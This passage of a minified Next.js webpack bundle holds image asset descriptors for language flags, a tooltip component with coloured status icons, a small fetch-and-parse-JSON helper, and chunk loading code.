                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAASFBMVEX/+vr////3VF+/VXf4VmfuZHPQ1edDVqn+/f3uVWbqVGbG0OitVH71ZXD//f3tVWbuZHL//f3////9WGbc4PJfb7pXW6rIW343TxsOAAAAEnRSTlP3ysuk/PKm/MXGxPv69sui+aBZXHR9AAAACXBIWXMAAAsTAAALEwEAmpwYAAAANUlEQVR4nB3BARKAIAgEwFNBQDMtLP//U6d2kYOq6nnhmfcHEKn4iRyNeTDe5UTkhBSLmVnfMnsBzrRXzYUAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        92338: (e, t, a) => {
            "use strict";
            a.d(t, {
                r: () => g
            });
            var n = a(95155),
                r = a(15992),
                o = a.n(r),
                i = a(29300),
                l = a.n(i);
            let c = {
                    src: "/_next/static/media/beak_bottom.5d2b8d4e.svg",
                    height: 9,
                    width: 16,
                    blurWidth: 0,
                    blurHeight: 0
                },
                s = {
                    src: "/_next/static/media/mark.72686f6e.svg",
                    height: 24,
                    width: 24,
                    blurWidth: 0,
                    blurHeight: 0
                };
            var d = a(12115),
                A = a(89613);
            let u = A.Kq,
                p = A.bL,
                h = A.l9,
                m = d.forwardRef((e, t) => {
                    let {
                        className: a,
                        sideOffset: r = 4,
                        ...o
                    } = e;
                    return (0, n.jsx)(A.UC, {
                        ref: t,
                        sideOffset: r,
                        className: l()("z-50 overflow-hidden  animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", a),
                        ...o
                    })
                });
            m.displayName = A.UC.displayName;
            var f = a(66766);
            let g = e => {
                let {
                    type: t = "",
                    title: a = "",
                    text: r = "",
                    exclamatory: i = !1
                } = e;
                return (0, n.jsx)(u, {
                    children: (0, n.jsxs)(p, {
                        delayDuration: 0,
                        children: [(0, n.jsx)(h, {
                            asChild: !0,
                            children: i ? (0, n.jsx)("div", {
                                className: "cursor-pointer",
                                children: (0, n.jsx)(f.default, {
                                    src: s,
                                    width: 24,
                                    height: 24,
                                    alt: "icon"
                                })
                            }) : (0, n.jsx)("span", {
                                className: o().span,
                                children: "?"
                            })
                        }), (0, n.jsx)(m, {
                            asChild: !0,
                            align: "start",
                            alignOffset: -16,
                            children: "orange" === t ? (0, n.jsxs)("div", {
                                className: l()(o().box, o().orange),
                                children: [(0, n.jsx)("svg", {
                                    width: 40,
                                    height: 40,
                                    viewBox: "0 0 40 40",
                                    fill: "none",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    className: "  w-10 h-10 ",
                                    preserveAspectRatio: "xMidYMid meet",
                                    children: (0, n.jsxs)("g", {
                                        clipPath: "url(#clip0_402_4026)",
                                        children: [(0, n.jsx)("path", {
                                            d: "M35 2.5C35.663 2.5 36.2989 2.76339 36.7678 3.23223C37.2366 3.70107 37.5 4.33696 37.5 5V35C37.5 35.663 37.2366 36.2989 36.7678 36.7678C36.2989 37.2366 35.663 37.5 35 37.5H5C4.33696 37.5 3.70107 37.2366 3.23223 36.7678C2.76339 36.2989 2.5 35.663 2.5 35V5C2.5 4.33696 2.76339 3.70107 3.23223 3.23223C3.70107 2.76339 4.33696 2.5 5 2.5H35ZM5 0C3.67392 0 2.40215 0.526784 1.46447 1.46447C0.526784 2.40215 0 3.67392 0 5L0 35C0 36.3261 0.526784 37.5979 1.46447 38.5355C2.40215 39.4732 3.67392 40 5 40H35C36.3261 40 37.5979 39.4732 38.5355 38.5355C39.4732 37.5979 40 36.3261 40 35V5C40 3.67392 39.4732 2.40215 38.5355 1.46447C37.5979 0.526784 36.3261 0 35 0L5 0Z",
                                            fill: "#FF5F04"
                                        }), (0, n.jsx)("path", {
                                            d: "M17.505 27.5C17.505 27.1717 17.5697 26.8467 17.6953 26.5433C17.8209 26.24 18.0051 25.9644 18.2372 25.7323C18.4694 25.5001 18.745 25.316 19.0483 25.1903C19.3516 25.0647 19.6767 25 20.005 25C20.3333 25 20.6584 25.0647 20.9617 25.1903C21.265 25.316 21.5406 25.5001 21.7728 25.7323C22.0049 25.9644 22.1891 26.24 22.3147 26.5433C22.4403 26.8467 22.505 27.1717 22.505 27.5C22.505 28.1631 22.2416 28.799 21.7728 29.2678C21.3039 29.7367 20.668 30 20.005 30C19.342 30 18.7061 29.7367 18.2372 29.2678C17.7684 28.799 17.505 28.1631 17.505 27.5ZM17.75 12.4875C17.7167 12.1722 17.7501 11.8533 17.848 11.5516C17.9459 11.25 18.1061 10.9723 18.3183 10.7365C18.5305 10.5008 18.7898 10.3123 19.0795 10.1833C19.3692 10.0542 19.6829 9.98755 20 9.98755C20.3172 9.98755 20.6308 10.0542 20.9205 10.1833C21.2102 10.3123 21.4695 10.5008 21.6817 10.7365C21.8939 10.9723 22.0541 11.25 22.152 11.5516C22.2499 11.8533 22.2833 12.1722 22.25 12.4875L21.375 21.255C21.3456 21.5995 21.188 21.9203 20.9334 22.1541C20.6788 22.3879 20.3457 22.5177 20 22.5177C19.6543 22.5177 19.3212 22.3879 19.0666 22.1541C18.812 21.9203 18.6544 21.5995 18.625 21.255L17.75 12.4875Z",
                                            fill: "#FF5F04"
                                        })]
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: "flex flex-col justify-center    ",
                                    children: [(0, n.jsx)("p", {
                                        className: "  text-[16px] text-start  ",
                                        children: a
                                    }), (0, n.jsx)("p", {
                                        className: "  text-[12px]  text-start ",
                                        children: r
                                    })]
                                })]
                            }) : "green" === t ? (0, n.jsxs)("div", {
                                className: l()(o().box, o().green),
                                children: [(0, n.jsx)("svg", {
                                    width: 40,
                                    height: 40,
                                    viewBox: "0 0 40 40",
                                    fill: "none",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    className: "  w-10 h-10 ",
                                    preserveAspectRatio: "xMidYMid meet",
                                    children: (0, n.jsxs)("g", {
                                        clipPath: "url(#clip0_402_4033)",
                                        children: [(0, n.jsx)("path", {
                                            d: "M35 2.5C35.663 2.5 36.2989 2.76339 36.7678 3.23223C37.2366 3.70107 37.5 4.33696 37.5 5V35C37.5 35.663 37.2366 36.2989 36.7678 36.7678C36.2989 37.2366 35.663 37.5 35 37.5H5C4.33696 37.5 3.70107 37.2366 3.23223 36.7678C2.76339 36.2989 2.5 35.663 2.5 35V5C2.5 4.33696 2.76339 3.70107 3.23223 3.23223C3.70107 2.76339 4.33696 2.5 5 2.5H35ZM5 0C3.67392 0 2.40215 0.526784 1.46447 1.46447C0.526784 2.40215 0 3.67392 0 5L0 35C0 36.3261 0.526784 37.5979 1.46447 38.5355C2.40215 39.4732 3.67392 40 5 40H35C36.3261 40 37.5979 39.4732 38.5355 38.5355C39.4732 37.5979 40 36.3261 40 35V5C40 3.67392 39.4732 2.40215 38.5355 1.46447C37.5979 0.526784 36.3261 0 35 0L5 0Z",
                                            fill: "#46C688"
                                        }), (0, n.jsx)("path", {
                                            d: "M27.425 12.425C27.7749 12.0781 28.2472 11.883 28.7399 11.8816C29.2325 11.8802 29.7059 12.0728 30.0577 12.4177C30.4094 12.7626 30.6114 13.2321 30.6198 13.7246C30.6282 14.2172 30.4424 14.6933 30.1025 15.05L20.1225 27.525C19.951 27.7097 19.744 27.858 19.5139 27.9609C19.2837 28.0638 19.0352 28.1192 18.7832 28.1239C18.5311 28.1286 18.2807 28.0824 18.0469 27.988C17.8131 27.8937 17.6008 27.7532 17.4225 27.575L10.81 20.96C10.6258 20.7883 10.4781 20.5813 10.3756 20.3513C10.2731 20.1213 10.218 19.873 10.2135 19.6213C10.2091 19.3695 10.2554 19.1194 10.3497 18.886C10.444 18.6525 10.5844 18.4404 10.7624 18.2624C10.9405 18.0843 11.1526 17.944 11.386 17.8497C11.6195 17.7554 11.8696 17.709 12.1213 17.7135C12.3731 17.7179 12.6214 17.773 12.8514 17.8755C13.0814 17.978 13.2884 18.1258 13.46 18.31L18.695 23.5425L27.3775 12.48L27.425 12.425Z",
                                            fill: "#46C688"
                                        })]
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: "flex flex-col justify-center    ",
                                    children: [(0, n.jsx)("p", {
                                        className: "  text-[16px] text-start  ",
                                        children: a
                                    }), (0, n.jsx)("p", {
                                        className: "  text-[12px]  text-start ",
                                        children: r
                                    })]
                                })]
                            }) : "yellow" === t ? (0, n.jsxs)("div", {
                                className: l()(o().box, o().yellow),
                                children: [(0, n.jsx)("svg", {
                                    width: 40,
                                    height: 40,
                                    viewBox: "0 0 40 40",
                                    fill: "none",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    className: "  w-10 h-10 ",
                                    preserveAspectRatio: "xMidYMid meet",
                                    children: (0, n.jsxs)("g", {
                                        clipPath: "url(#clip0_402_4040)",
                                        children: [(0, n.jsx)("path", {
                                            d: "M35 2.5C35.663 2.5 36.2989 2.76339 36.7678 3.23223C37.2366 3.70107 37.5 4.33696 37.5 5V35C37.5 35.663 37.2366 36.2989 36.7678 36.7678C36.2989 37.2366 35.663 37.5 35 37.5H5C4.33696 37.5 3.70107 37.2366 3.23223 36.7678C2.76339 36.2989 2.5 35.663 2.5 35V5C2.5 4.33696 2.76339 3.70107 3.23223 3.23223C3.70107 2.76339 4.33696 2.5 5 2.5H35ZM5 0C3.67392 0 2.40215 0.526784 1.46447 1.46447C0.526784 2.40215 0 3.67392 0 5L0 35C0 36.3261 0.526784 37.5979 1.46447 38.5355C2.40215 39.4732 3.67392 40 5 40H35C36.3261 40 37.5979 39.4732 38.5355 38.5355C39.4732 37.5979 40 36.3261 40 35V5C40 3.67392 39.4732 2.40215 38.5355 1.46447C37.5979 0.526784 36.3261 0 35 0L5 0Z",
                                            fill: "#FFB800"
                                        }), (0, n.jsx)("path", {
                                            d: "M22.325 16.47L16.6 17.1875L16.395 18.1375L17.52 18.345C18.255 18.52 18.4 18.785 18.24 19.5175L16.395 28.1875C15.91 30.43 16.6575 31.485 18.415 31.485C19.7775 31.485 21.36 30.855 22.0775 29.99L22.2975 28.95C21.7975 29.39 21.0675 29.565 20.5825 29.565C19.895 29.565 19.645 29.0825 19.8225 28.2325L22.325 16.47ZM22.5 11.25C22.5 11.913 22.2366 12.5489 21.7678 13.0178C21.2989 13.4866 20.663 13.75 20 13.75C19.337 13.75 18.7011 13.4866 18.2322 13.0178C17.7634 12.5489 17.5 11.913 17.5 11.25C17.5 10.587 17.7634 9.95107 18.2322 9.48223C18.7011 9.01339 19.337 8.75 20 8.75C20.663 8.75 21.2989 9.01339 21.7678 9.48223C22.2366 9.95107 22.5 10.587 22.5 11.25Z",
                                            fill: "#FFB800"
                                        })]
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: "flex flex-col justify-center    ",
                                    children: [(0, n.jsx)("p", {
                                        className: "  text-[16px] text-start  ",
                                        children: a
                                    }), (0, n.jsx)("p", {
                                        className: "  text-[12px]  text-start ",
                                        children: r
                                    })]
                                })]
                            }) : (0, n.jsxs)("div", {
                                children: [(0, n.jsx)("p", {
                                    className: o().frame,
                                    children: r
                                }), (0, n.jsx)("p", {
                                    className: o().arrow,
                                    children: (0, n.jsx)(f.default, {
                                        src: c,
                                        width: 16,
                                        height: 9,
                                        alt: ""
                                    })
                                })]
                            })
                        })]
                    })
                })
            }
        },
        94052: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = function() {
                for (var e = arguments.length, t = Array(e), a = 0; a < e; a++) t[a] = arguments[a];
                return fetch(...t).then(e => e.json())
            }
        },
        95700: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/fr.1a8b91b5.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAMFBMVEX///8EKljTFSrOARfmeYUAF0nOFCnLARYEKVb////9//8AFkjjeINvhJ1wg55yhqGhbpa+AAAAD3RSTlP+/v7+/v6t2q3U1NrT/dORApTzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAI0lEQVR4nGPg4Obj5OJhZ2NgZOVnYGBhZmJgZOXFYEClYIoBHRkBDyb3CuMAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        98407: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/pt.446aea28.svg",
                height: 400,
                width: 600,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        98582: (e, t, a) => {
            Promise.resolve().then(a.bind(a, 46160)), Promise.resolve().then(a.bind(a, 46096)), Promise.resolve().then(a.t.bind(a, 33063, 23)), Promise.resolve().then(a.bind(a, 18120)), Promise.resolve().then(a.bind(a, 41804)), Promise.resolve().then(a.t.bind(a, 25503, 23)), Promise.resolve().then(a.bind(a, 54949)), Promise.resolve().then(a.t.bind(a, 80756, 23)), Promise.resolve().then(a.bind(a, 17798)), Promise.resolve().then(a.bind(a, 13306)), Promise.resolve().then(a.bind(a, 39653)), Promise.resolve().then(a.bind(a, 57527))
        },
        98608: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/it.3f86a570.svg",
                height: 1e3,
                width: 1500,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        98777: e => {
            e.exports = {
                body: "languages_body__GFhL4",
                lang: "languages_lang__DRXOS"
            }
        },
        98949: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/de.24643249.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAJFBMVEUAAADFAADkEgD/0QD/0QD/0QAAAADlEQD/0gD/0QD/zAAJAQBmeTZcAAAACnRSTlPW/f3U09qt/aytgtPh9AAAAAlwSFlzAAALEwAACxMBAJqcGAAAACVJREFUeJxjYGMAAzYGbihgYIQCBiYIYGfgggIGDlYWZmYWVk4AGCQA+x+Kb/cAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 6
            }
        }
    },
    e => {
        var t = t => e(e.s = t);
        e.O(0, [32, 6599, 9149, 1129, 8956, 6453, 3063, 6874, 4953, 1755, 5694, 7477, 8676, 2441, 3870, 9231, 3482, 8441, 1684, 7358], () => t(98582)), _N_E = e.O()
    }
]);